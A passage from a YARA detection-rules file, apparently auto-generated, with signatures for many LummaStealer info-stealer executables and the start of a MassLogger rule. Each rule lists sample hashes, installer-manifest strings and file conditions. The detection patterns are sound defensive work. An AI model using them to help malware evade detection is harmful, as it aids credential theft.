      hash1 = "6023632ffb75c317ee07a42f53c623a6f6ef01f7c7a3f62b460ea1eb5f3f1ed5"
   strings:
      $x1 = "<?xml version=\"1.0\" encoding=\"UTF-8\" standalone=\"yes\"?><assembly xmlns=\"urn:schemas-microsoft-com:asm.v1\" manifestVersio" ascii /* score: '50.00'*/
      $s2 = " Install System v9.93.5-Unicode</description><trustInfo xmlns=\"urn:schemas-microsoft-com:asm.v3\"><security><requestedPrivilege" ascii /* score: '16.00'*/
      $s3 = "Rycq:\\d" fullword ascii /* score: '10.00'*/
      $s4 = "'!!!OAAA}\\\\\\" fullword ascii /* score: '9.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 3000KB and
      1 of ($x*) and all of them
}

rule LummaStealer_signature__32f3282581436269b3a75b6675fe3e08_imphash__1848c1c0 {
   meta:
      description = "_subset_batch - file LummaStealer(signature)_32f3282581436269b3a75b6675fe3e08(imphash)_1848c1c0.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "1848c1c0245e45a92c29001f6babad791b37f00c5609f6ac8a4605a34a9ad7c7"
   strings:
      $x1 = "<?xml version=\"1.0\" encoding=\"UTF-8\" standalone=\"yes\"?><assembly xmlns=\"urn:schemas-microsoft-com:asm.v1\" manifestVersio" ascii /* score: '50.00'*/
      $s2 = " Install System v5.37.7-Unicode</description><trustInfo xmlns=\"urn:schemas-microsoft-com:asm.v3\"><security><requestedPrivilege" ascii /* score: '16.00'*/
      $s3 = ">,>3>>>F>{>" fullword ascii /* score: '9.00'*/ /* hex encoded string '?' */
      $s4 = "<*<5<D<`<" fullword ascii /* score: '9.00'*/ /* hex encoded string ']' */
   condition:
      uint16(0) == 0x5a4d and filesize < 3000KB and
      1 of ($x*) and all of them
}

rule LummaStealer_signature__c32ba42c73a2bc24d2788f7750d87edb_imphash__6c89814b {
   meta:
      description = "_subset_batch - file LummaStealer(signature)_c32ba42c73a2bc24d2788f7750d87edb(imphash)_6c89814b.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "6c89814b6b4b463df844e72b171a2d56d8f22f587c3a5d5afa3a498c225156b5"
   strings:
      $x1 = "<?xml version=\"1.0\" encoding=\"UTF-8\" standalone=\"yes\"?><assembly xmlns=\"urn:schemas-microsoft-com:asm.v1\" manifestVersio" ascii /* score: '50.00'*/
      $s2 = " Install System v9.76.3-Unicode</description><trustInfo xmlns=\"urn:schemas-microsoft-com:asm.v3\"><security><requestedPrivilege" ascii /* score: '16.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 3000KB and
      1 of ($x*) and all of them
}

rule LummaStealer_signature__32f3282581436269b3a75b6675fe3e08_imphash__5fa6d4eb {
   meta:
      description = "_subset_batch - file LummaStealer(signature)_32f3282581436269b3a75b6675fe3e08(imphash)_5fa6d4eb.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "5fa6d4eb94cbd4549257bb4ed4974565b2298902ecf8f902507565870472fada"
   strings:
      $x1 = "<?xml version=\"1.0\" encoding=\"UTF-8\" standalone=\"yes\"?><assembly xmlns=\"urn:schemas-microsoft-com:asm.v1\" manifestVersio" ascii /* score: '50.00'*/
      $s2 = " Install System v2.53.7-Unicode</description><trustInfo xmlns=\"urn:schemas-microsoft-com:asm.v3\"><security><requestedPrivilege" ascii /* score: '16.00'*/
      $s3 = ">,>3>>>F>{>" fullword ascii /* score: '9.00'*/ /* hex encoded string '?' */
      $s4 = "<*<5<D<`<" fullword ascii /* score: '9.00'*/ /* hex encoded string ']' */
      $s5 = "* U,mX" fullword ascii /* score: '9.00'*/
      $s6 = "hbhihchg" fullword ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 3000KB and
      1 of ($x*) and all of them
}

rule LummaStealer_signature__32f3282581436269b3a75b6675fe3e08_imphash__7660218f {
   meta:
      description = "_subset_batch - file LummaStealer(signature)_32f3282581436269b3a75b6675fe3e08(imphash)_7660218f.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "7660218fc7eda670cc4bb9f644231117b386b890dbceef4c44b449c67decf1e3"
   strings:
      $x1 = "<?xml version=\"1.0\" encoding=\"UTF-8\" standalone=\"yes\"?><assembly xmlns=\"urn:schemas-microsoft-com:asm.v1\" manifestVersio" ascii /* score: '50.00'*/
      $s2 = " Install System v5.65.8-Unicode</description><trustInfo xmlns=\"urn:schemas-microsoft-com:asm.v3\"><security><requestedPrivilege" ascii /* score: '16.00'*/
      $s3 = ">,>3>>>F>{>" fullword ascii /* score: '9.00'*/ /* hex encoded string '?' */
      $s4 = "<*<5<D<`<" fullword ascii /* score: '9.00'*/ /* hex encoded string ']' */
   condition:
      uint16(0) == 0x5a4d and filesize < 3000KB and
      1 of ($x*) and all of them
}

rule LummaStealer_signature__32f3282581436269b3a75b6675fe3e08_imphash__8b081afc {
   meta:
      description = "_subset_batch - file LummaStealer(signature)_32f3282581436269b3a75b6675fe3e08(imphash)_8b081afc.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "8b081afc4305a7731e4f1e4c12ebd1fe5c3ffe0d667923aaaf19731c62600ba4"
   strings:
      $x1 = "<?xml version=\"1.0\" encoding=\"UTF-8\" standalone=\"yes\"?><assembly xmlns=\"urn:schemas-microsoft-com:asm.v1\" manifestVersio" ascii /* score: '50.00'*/
      $s2 = " Install System v2.99.6-Unicode</description><trustInfo xmlns=\"urn:schemas-microsoft-com:asm.v3\"><security><requestedPrivilege" ascii /* score: '16.00'*/
      $s3 = "KHHL!!!!" fullword ascii /* score: '13.00'*/
      $s4 = ">,>3>>>F>{>" fullword ascii /* score: '9.00'*/ /* hex encoded string '?' */
      $s5 = "<*<5<D<`<" fullword ascii /* score: '9.00'*/ /* hex encoded string ']' */
      $s6 = " -++7DBBPYWWefddskjixjhhwfedufeetiggtkjjulkkumkkukkjujihuhgfufeducbaua`_u`]\\u^\\[u^[Zu^\\[u_\\[u`]\\u`]\\u_[Zt^[Zt^ZYu_\\[x_[Zx" ascii /* score: '8.00'*/
      $s7 = " -++7DBBPYWWefddskjixjhhwfedufeetiggtkjjulkkumkkukkjujihuhgfufeducbaua`_u`]\\u^\\[u^[Zu^\\[u_\\[u`]\\u`]\\u_[Zt^[Zt^ZYu_\\[x_[Zx" ascii /* score: '8.00'*/
      $s8 = "%VJoK%cx" fullword ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 3000KB and
      1 of ($x*) and all of them
}

rule LummaStealer_signature__32f3282581436269b3a75b6675fe3e08_imphash__bb0c41f9 {
   meta:
      description = "_subset_batch - file LummaStealer(signature)_32f3282581436269b3a75b6675fe3e08(imphash)_bb0c41f9.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "bb0c41f963da2f0eb38c7265e439bda2d61bbd6cfabd149bf1fe86fdf7190212"
   strings:
      $x1 = "<?xml version=\"1.0\" encoding=\"UTF-8\" standalone=\"yes\"?><assembly xmlns=\"urn:schemas-microsoft-com:asm.v1\" manifestVersio" ascii /* score: '50.00'*/
      $s2 = " Install System v2.46.3-Unicode</description><trustInfo xmlns=\"urn:schemas-microsoft-com:asm.v3\"><security><requestedPrivilege" ascii /* score: '16.00'*/
      $s3 = ">,>3>>>F>{>" fullword ascii /* score: '9.00'*/ /* hex encoded string '?' */
      $s4 = "<*<5<D<`<" fullword ascii /* score: '9.00'*/ /* hex encoded string ']' */
      $s5 = "rgqrIrC" fullword ascii /* score: '9.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 3000KB and
      1 of ($x*) and all of them
}

rule LummaStealer_signature__c32ba42c73a2bc24d2788f7750d87edb_imphash__0c58dca4 {
   meta:
      description = "_subset_batch - file LummaStealer(signature)_c32ba42c73a2bc24d2788f7750d87edb(imphash)_0c58dca4.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "0c58dca4269aa53f31b234f494003c1d4a6eb04906f81a8f79fb236d374e2895"
   strings:
      $x1 = "<?xml version=\"1.0\" encoding=\"UTF-8\" standalone=\"yes\"?><assembly xmlns=\"urn:schemas-microsoft-com:asm.v1\" manifestVersio" ascii /* score: '50.00'*/
      $s2 = " Install System v2.46.2-Unicode</description><trustInfo xmlns=\"urn:schemas-microsoft-com:asm.v3\"><security><requestedPrivilege" ascii /* score: '16.00'*/
      $s3 = "SecureInno Technologies Co." fullword wide /* score: '11.00'*/
      $s4 = " SecureInno Technologies Co. 2011 All rights reserved." fullword wide /* score: '11.00'*/
      $s5 = "R*i* -I" fullword ascii /* score: '9.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 3000KB and
      1 of ($x*) and all of them
}

rule LummaStealer_signature__b729b61eb1515fcf7b3e511e4e66258b_imphash__45618c76 {
   meta:
      description = "_subset_batch - file LummaStealer(signature)_b729b61eb1515fcf7b3e511e4e66258b(imphash)_45618c76.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "45618c762ce6fdd74ec281e8f882d24b3ce20ec4a3fb4f36aba5fc903c5f0c79"
   strings:
      $x1 = "<?xml version=\"1.0\" encoding=\"UTF-8\" standalone=\"yes\"?><assembly xmlns=\"urn:schemas-microsoft-com:asm.v1\" manifestVersio" ascii /* score: '50.00'*/
      $s2 = " Install System v6.31.5-Unicode</description><trustInfo xmlns=\"urn:schemas-microsoft-com:asm.v3\"><security><requestedPrivilege" ascii /* score: '16.00'*/
      $s3 = "gRHx -;R" fullword ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 3000KB and
      1 of ($x*) and all of them
}

rule LummaStealer_signature__b729b61eb1515fcf7b3e511e4e66258b_imphash__46202dc9 {
   meta:
      description = "_subset_batch - file LummaStealer(signature)_b729b61eb1515fcf7b3e511e4e66258b(imphash)_46202dc9.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "46202dc94b23e401ed88b9ec136b2da11e73666fc2db58f88aae2a5f07de9a08"
   strings:
      $x1 = "<?xml version=\"1.0\" encoding=\"UTF-8\" standalone=\"yes\"?><assembly xmlns=\"urn:schemas-microsoft-com:asm.v1\" manifestVersio" ascii /* score: '50.00'*/
      $s2 = " Install System v1.13.1-Unicode</description><trustInfo xmlns=\"urn:schemas-microsoft-com:asm.v3\"><security><requestedPrivilege" ascii /* score: '16.00'*/
      $s3 = "* G<&0@\"" fullword ascii /* score: '9.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 3000KB and
      1 of ($x*) and all of them
}

rule LummaStealer_signature__c32ba42c73a2bc24d2788f7750d87edb_imphash__40ded17d {
   meta:
      description = "_subset_batch - file LummaStealer(signature)_c32ba42c73a2bc24d2788f7750d87edb(imphash)_40ded17d.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "40ded17d527905103e45dc1be6d4033c33a3fc7617496b5b41893108f658d392"
   strings:
      $x1 = "<?xml version=\"1.0\" encoding=\"UTF-8\" standalone=\"yes\"?><assembly xmlns=\"urn:schemas-microsoft-com:asm.v1\" manifestVersio" ascii /* score: '50.00'*/
      $s2 = " Install System v2.46.2-Unicode</description><trustInfo xmlns=\"urn:schemas-microsoft-com:asm.v3\"><security><requestedPrivilege" ascii /* score: '16.00'*/
      $s3 = "cccx???T###5!!!5<<<T_``x" fullword ascii /* score: '9.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 3000KB and
      1 of ($x*) and all of them
}

rule LummaStealer_signature__b729b61eb1515fcf7b3e511e4e66258b_imphash__881cea2f {
   meta:
      description = "_subset_batch - file LummaStealer(signature)_b729b61eb1515fcf7b3e511e4e66258b(imphash)_881cea2f.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "881cea2ff3fa770ab6eedbb64983c5c9d982aeb0601313aed52fd2f09e8a960d"
   strings:
      $x1 = "<?xml version=\"1.0\" encoding=\"UTF-8\" standalone=\"yes\"?><assembly xmlns=\"urn:schemas-microsoft-com:asm.v1\" manifestVersio" ascii /* score: '50.00'*/
      $s2 = " Install System v3.89.5-Unicode</description><trustInfo xmlns=\"urn:schemas-microsoft-com:asm.v3\"><security><requestedPrivilege" ascii /* score: '16.00'*/
      $s3 = "2  \"[444" fullword ascii /* score: '9.00'*/ /* hex encoded string '$D' */
   condition:
      uint16(0) == 0x5a4d and filesize < 3000KB and
      1 of ($x*) and all of them
}

rule LummaStealer_signature__c32ba42c73a2bc24d2788f7750d87edb_imphash__028877d9 {
   meta:
      description = "_subset_batch - file LummaStealer(signature)_c32ba42c73a2bc24d2788f7750d87edb(imphash)_028877d9.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "028877d9d46798d2ede46678514aa64bc3ae6c704a012811089a9926609b7601"
   strings:
      $x1 = "<?xml version=\"1.0\" encoding=\"UTF-8\" standalone=\"yes\"?><assembly xmlns=\"urn:schemas-microsoft-com:asm.v1\" manifestVersio" ascii /* score: '50.00'*/
      $s2 = " Install System v2.46.5-Unicode</description><trustInfo xmlns=\"urn:schemas-microsoft-com:asm.v3\"><security><requestedPrivilege" ascii /* score: '16.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 3000KB and
      1 of ($x*) and all of them
}

rule LummaStealer_signature__c32ba42c73a2bc24d2788f7750d87edb_imphash__98057ad0 {
   meta:
      description = "_subset_batch - file LummaStealer(signature)_c32ba42c73a2bc24d2788f7750d87edb(imphash)_98057ad0.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "98057ad0897523d4001dfc9e912bf6dd0aeba4438e3e6b970acd9dd8df52b5c1"
   strings:
      $x1 = "<?xml version=\"1.0\" encoding=\"UTF-8\" standalone=\"yes\"?><assembly xmlns=\"urn:schemas-microsoft-com:asm.v1\" manifestVersio" ascii /* score: '50.00'*/
      $s2 = " Install System v2.46.2-Unicode</description><trustInfo xmlns=\"urn:schemas-microsoft-com:asm.v3\"><security><requestedPrivilege" ascii /* score: '16.00'*/
      $s3 = "POUe:\\" fullword ascii /* score: '10.00'*/
      $s4 = "###,777c:::" fullword ascii /* score: '9.00'*/ /* hex encoded string 'w|' */
   condition:
      uint16(0) == 0x5a4d and filesize < 3000KB and
      1 of ($x*) and all of them
}

rule LummaStealer_signature__c32ba42c73a2bc24d2788f7750d87edb_imphash__dc600fdc {
   meta:
      description = "_subset_batch - file LummaStealer(signature)_c32ba42c73a2bc24d2788f7750d87edb(imphash)_dc600fdc.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "dc600fdcc37eff865d7a4faa70f2e2ea39862c6987c002b5d409a4abf5870667"
   strings:
      $x1 = "<?xml version=\"1.0\" encoding=\"UTF-8\" standalone=\"yes\"?><assembly xmlns=\"urn:schemas-microsoft-com:asm.v1\" manifestVersio" ascii /* score: '50.00'*/
      $s2 = " Install System v1.16.9-Unicode</description><trustInfo xmlns=\"urn:schemas-microsoft-com:asm.v3\"><security><requestedPrivilege" ascii /* score: '16.00'*/
      $s3 = "* Qz8A" fullword ascii /* score: '9.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 25000KB and
      1 of ($x*) and all of them
}

rule LummaStealer_signature__b729b61eb1515fcf7b3e511e4e66258b_imphash__68ac4d02 {
   meta:
      description = "_subset_batch - file LummaStealer(signature)_b729b61eb1515fcf7b3e511e4e66258b(imphash)_68ac4d02.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "68ac4d0278c8a68967dc3f71bdbbaf73ec5b79b6ca20400f854d0a1f9087b2c8"
   strings:
      $x1 = "<?xml version=\"1.0\" encoding=\"UTF-8\" standalone=\"yes\"?><assembly xmlns=\"urn:schemas-microsoft-com:asm.v1\" manifestVersio" ascii /* score: '50.00'*/
      $s2 = " Install System v7.38.3-Unicode</description><trustInfo xmlns=\"urn:schemas-microsoft-com:asm.v3\"><security><requestedPrivilege" ascii /* score: '16.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 3000KB and
      1 of ($x*) and all of them
}

rule LummaStealer_signature__c32ba42c73a2bc24d2788f7750d87edb_imphash__2581c318 {
   meta:
      description = "_subset_batch - file LummaStealer(signature)_c32ba42c73a2bc24d2788f7750d87edb(imphash)_2581c318.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "2581c31862dbfc47ac0c1760d12ee91b340349fbcae5a561dfcffed49f8ab3d6"
   strings:
      $x1 = "<?xml version=\"1.0\" encoding=\"UTF-8\" standalone=\"yes\"?><assembly xmlns=\"urn:schemas-microsoft-com:asm.v1\" manifestVersio" ascii /* score: '50.00'*/
      $s2 = " Install System v2.46.2-Unicode</description><trustInfo xmlns=\"urn:schemas-microsoft-com:asm.v3\"><security><requestedPrivilege" ascii /* score: '16.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 3000KB and
      1 of ($x*) and all of them
}

rule LummaStealer_signature__b729b61eb1515fcf7b3e511e4e66258b_imphash__768c750a {
   meta:
      description = "_subset_batch - file LummaStealer(signature)_b729b61eb1515fcf7b3e511e4e66258b(imphash)_768c750a.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "768c750aed3843832c11003b6d1984ba2c30cf7932cd68bddf7e614de08d09da"
   strings:
      $x1 = "<?xml version=\"1.0\" encoding=\"UTF-8\" standalone=\"yes\"?><assembly xmlns=\"urn:schemas-microsoft-com:asm.v1\" manifestVersio" ascii /* score: '50.00'*/
      $s2 = " Install System v4.84.5-Unicode</description><trustInfo xmlns=\"urn:schemas-microsoft-com:asm.v3\"><security><requestedPrivilege" ascii /* score: '16.00'*/
      $s3 = "* Og4U" fullword ascii /* score: '9.00'*/
      $s4 = "raKu- [" fullword ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 3000KB and
      1 of ($x*) and all of them
}

rule LummaStealer_signature__c32ba42c73a2bc24d2788f7750d87edb_imphash__cf97e2da {
   meta:
      description = "_subset_batch - file LummaStealer(signature)_c32ba42c73a2bc24d2788f7750d87edb(imphash)_cf97e2da.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "cf97e2dae232c37f66657b1dc1e19c8a418f5321b5c98de78ff1f72c066287ad"
   strings:
      $x1 = "<?xml version=\"1.0\" encoding=\"UTF-8\" standalone=\"yes\"?><assembly xmlns=\"urn:schemas-microsoft-com:asm.v1\" manifestVersio" ascii /* score: '50.00'*/
      $s2 = " Install System v4.52.8-Unicode</description><trustInfo xmlns=\"urn:schemas-microsoft-com:asm.v3\"><security><requestedPrivilege" ascii /* score: '16.00'*/
      $s3 = "6.42.7.2639" fullword wide /* score: '9.00'*/ /* hex encoded string 'd'&9' */
   condition:
      uint16(0) == 0x5a4d and filesize < 3000KB and
      1 of ($x*) and all of them
}

rule LummaStealer_signature__b729b61eb1515fcf7b3e511e4e66258b_imphash__5fe985e5 {
   meta:
      description = "_subset_batch - file LummaStealer(signature)_b729b61eb1515fcf7b3e511e4e66258b(imphash)_5fe985e5.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "5fe985e50909f70b3379db006584d368e5418b3561df576ecbabb95e57f2168e"
   strings:
      $x1 = "<?xml version=\"1.0\" encoding=\"UTF-8\" standalone=\"yes\"?><assembly xmlns=\"urn:schemas-microsoft-com:asm.v1\" manifestVersio" ascii /* score: '50.00'*/
      $s2 = " Install System v5.63.9-Unicode</description><trustInfo xmlns=\"urn:schemas-microsoft-com:asm.v3\"><security><requestedPrivilege" ascii /* score: '16.00'*/
      $s3 = "cvwnwngw" fullword ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 3000KB and
      1 of ($x*) and all of them
}

rule LummaStealer_signature__c32ba42c73a2bc24d2788f7750d87edb_imphash_ {
   meta:
      description = "_subset_batch - file LummaStealer(signature)_c32ba42c73a2bc24d2788f7750d87edb(imphash).exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "8d1691a0af05e8707e791858df05a015f90dab764f0696a18ef520a4422fdcba"
   strings:
      $x1 = "<?xml version=\"1.0\" encoding=\"UTF-8\" standalone=\"yes\"?><assembly xmlns=\"urn:schemas-microsoft-com:asm.v1\" manifestVersio" ascii /* score: '50.00'*/
      $s2 = " Install System v2.46.2-Unicode</description><trustInfo xmlns=\"urn:schemas-microsoft-com:asm.v3\"><security><requestedPrivilege" ascii /* score: '16.00'*/
      $s3 = "TrackGuard Technologies" fullword wide /* score: '9.00'*/
      $s4 = " TrackGuard Technologies 2018 All rights reserved." fullword wide /* score: '9.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 3000KB and
      1 of ($x*) and all of them
}

rule LummaStealer_signature__c32ba42c73a2bc24d2788f7750d87edb_imphash__04147f64 {
   meta:
      description = "_subset_batch - file LummaStealer(signature)_c32ba42c73a2bc24d2788f7750d87edb(imphash)_04147f64.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "04147f645c58f1cfb4271624fce51a9fba75d423a4c748bcdc914e9f827d47b6"
   strings:
      $x1 = "<?xml version=\"1.0\" encoding=\"UTF-8\" standalone=\"yes\"?><assembly xmlns=\"urn:schemas-microsoft-com:asm.v1\" manifestVersio" ascii /* score: '50.00'*/
      $s2 = " Install System v2.46.5-Unicode</description><trustInfo xmlns=\"urn:schemas-microsoft-com:asm.v3\"><security><requestedPrivilege" ascii /* score: '16.00'*/
      $s3 = "* Qz8A" fullword ascii /* score: '9.00'*/
      $s4 = "XjEP0C!#" fullword ascii /* score: '9.00'*/
      $s5 = "1Y?yNfTpb\\t" fullword ascii /* score: '9.00'*/
      $s6 = "oDqU%o%%" fullword ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 3000KB and
      1 of ($x*) and all of them
}

rule LummaStealer_signature__b729b61eb1515fcf7b3e511e4e66258b_imphash__3e778018 {
   meta:
      description = "_subset_batch - file LummaStealer(signature)_b729b61eb1515fcf7b3e511e4e66258b(imphash)_3e778018.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "3e778018582fb7233ef6a89de0b1d814aa699024d499e849911ab59914b65956"
   strings:
      $x1 = "<?xml version=\"1.0\" encoding=\"UTF-8\" standalone=\"yes\"?><assembly xmlns=\"urn:schemas-microsoft-com:asm.v1\" manifestVersio" ascii /* score: '50.00'*/
      $s2 = " Install System v7.54.9-Unicode</description><trustInfo xmlns=\"urn:schemas-microsoft-com:asm.v3\"><security><requestedPrivilege" ascii /* score: '16.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 4000KB and
      1 of ($x*) and all of them
}

rule LummaStealer_signature__b729b61eb1515fcf7b3e511e4e66258b_imphash__e65c3aec {
   meta:
      description = "_subset_batch - file LummaStealer(signature)_b729b61eb1515fcf7b3e511e4e66258b(imphash)_e65c3aec.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "e65c3aece41e207dcdfa829814d24c3c662a776d56d568040fd70d32e8b9cda0"
   strings:
      $x1 = "<?xml version=\"1.0\" encoding=\"UTF-8\" standalone=\"yes\"?><assembly xmlns=\"urn:schemas-microsoft-com:asm.v1\" manifestVersio" ascii /* score: '50.00'*/
      $s2 = " Install System v4.45.3-Unicode</description><trustInfo xmlns=\"urn:schemas-microsoft-com:asm.v3\"><security><requestedPrivilege" ascii /* score: '16.00'*/
      $s3 = "?,4\"(24<f" fullword ascii /* score: '9.00'*/ /* hex encoded string 'BO' */
   condition:
      uint16(0) == 0x5a4d and filesize < 3000KB and
      1 of ($x*) and all of them
}

rule LummaStealer_signature__c32ba42c73a2bc24d2788f7750d87edb_imphash__2be6522c {
   meta:
      description = "_subset_batch - file LummaStealer(signature)_c32ba42c73a2bc24d2788f7750d87edb(imphash)_2be6522c.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "2be6522c4fa20c670fa0658435c4fabfae37a46222b7cf049d4a6f6576704ca7"
   strings:
      $x1 = "<?xml version=\"1.0\" encoding=\"UTF-8\" standalone=\"yes\"?><assembly xmlns=\"urn:schemas-microsoft-com:asm.v1\" manifestVersio" ascii /* score: '50.00'*/
      $s2 = " Install System v2.46.5-Unicode</description><trustInfo xmlns=\"urn:schemas-microsoft-com:asm.v3\"><security><requestedPrivilege" ascii /* score: '16.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 3000KB and
      1 of ($x*) and all of them
}

rule LummaStealer_signature__b729b61eb1515fcf7b3e511e4e66258b_imphash__62de658c {
   meta:
      description = "_subset_batch - file LummaStealer(signature)_b729b61eb1515fcf7b3e511e4e66258b(imphash)_62de658c.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "62de658cd6b8a94b2fd0b9e17f6f54447a3a2f7b687d6267bdf178f9ea7f8807"
   strings:
      $x1 = "<?xml version=\"1.0\" encoding=\"UTF-8\" standalone=\"yes\"?><assembly xmlns=\"urn:schemas-microsoft-com:asm.v1\" manifestVersio" ascii /* score: '50.00'*/
      $s2 = " Install System v5.96.8-Unicode</description><trustInfo xmlns=\"urn:schemas-microsoft-com:asm.v3\"><security><requestedPrivilege" ascii /* score: '16.00'*/
      $s3 = "133333" ascii /* reversed goodware string '333331' */ /* score: '11.00'*/
      $s4 = "XADS ->9" fullword ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 3000KB and
      1 of ($x*) and all of them
}

rule LummaStealer_signature__c32ba42c73a2bc24d2788f7750d87edb_imphash__5855eeec {
   meta:
      description = "_subset_batch - file LummaStealer(signature)_c32ba42c73a2bc24d2788f7750d87edb(imphash)_5855eeec.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "5855eeecc29f53f6d4e297bcc4511ea6e7acb5fa04118b0decc02f3292585e59"
   strings:
      $x1 = "<?xml version=\"1.0\" encoding=\"UTF-8\" standalone=\"yes\"?><assembly xmlns=\"urn:schemas-microsoft-com:asm.v1\" manifestVersio" ascii /* score: '50.00'*/
      $s2 = " Install System v5.55.9-Unicode</description><trustInfo xmlns=\"urn:schemas-microsoft-com:asm.v3\"><security><requestedPrivilege" ascii /* score: '16.00'*/
      $s3 = "* PTmE" fullword ascii /* score: '9.00'*/
      $s4 = " EchoGuard Technologies 2017 All rights reserved." fullword wide /* score: '9.00'*/
      $s5 = "EchoGuard is a trademark of EchoGuard Technologies" fullword wide /* score: '9.00'*/
      $s6 = "EchoGuard Technologies" fullword wide /* score: '9.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 3000KB and
      1 of ($x*) and all of them
}

rule LummaStealer_signature__c32ba42c73a2bc24d2788f7750d87edb_imphash__93b9e2b7 {
   meta:
      description = "_subset_batch - file LummaStealer(signature)_c32ba42c73a2bc24d2788f7750d87edb(imphash)_93b9e2b7.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "93b9e2b707351de7804bd1580e8168e811af0e6ec6fcf8e5846e66ad94b1b68a"
   strings:
      $x1 = "<?xml version=\"1.0\" encoding=\"UTF-8\" standalone=\"yes\"?><assembly xmlns=\"urn:schemas-microsoft-com:asm.v1\" manifestVersio" ascii /* score: '50.00'*/
      $s2 = " Install System v3.92.8-Unicode</description><trustInfo xmlns=\"urn:schemas-microsoft-com:asm.v3\"><security><requestedPrivilege" ascii /* score: '16.00'*/
      $s3 = "* Ot@T)" fullword ascii /* score: '9.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 3000KB and
      1 of ($x*) and all of them
}

rule LummaStealer_signature__b729b61eb1515fcf7b3e511e4e66258b_imphash__d633a2b3 {
   meta:
      description = "_subset_batch - file LummaStealer(signature)_b729b61eb1515fcf7b3e511e4e66258b(imphash)_d633a2b3.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "d633a2b32b1a5e532e4fdf2ce77cd55aa7007daa33ddba5ac1735f634a5bd1fb"
   strings:
      $x1 = "<?xml version=\"1.0\" encoding=\"UTF-8\" standalone=\"yes\"?><assembly xmlns=\"urn:schemas-microsoft-com:asm.v1\" manifestVersio" ascii /* score: '50.00'*/
      $s2 = " Install System v9.12.3-Unicode</description><trustInfo xmlns=\"urn:schemas-microsoft-com:asm.v3\"><security><requestedPrivilege" ascii /* score: '16.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 3000KB and
      1 of ($x*) and all of them
}

rule LummaStealer_signature__c32ba42c73a2bc24d2788f7750d87edb_imphash__30d5c7f8 {
   meta:
      description = "_subset_batch - file LummaStealer(signature)_c32ba42c73a2bc24d2788f7750d87edb(imphash)_30d5c7f8.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "30d5c7f85136d0ec18ff98dfbc8f639bd32aab86391f576839b7787a13ccda8d"
   strings:
      $x1 = "<?xml version=\"1.0\" encoding=\"UTF-8\" standalone=\"yes\"?><assembly xmlns=\"urn:schemas-microsoft-com:asm.v1\" manifestVersio" ascii /* score: '50.00'*/
      $s2 = " Install System v2.46.2-Unicode</description><trustInfo xmlns=\"urn:schemas-microsoft-com:asm.v3\"><security><requestedPrivilege" ascii /* score: '16.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 3000KB and
      1 of ($x*) and all of them
}

rule MassLogger_signature__82b9ae10 {
   meta:
      description = "_subset_batch - file MassLogger(signature)_82b9ae10.xlsx"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
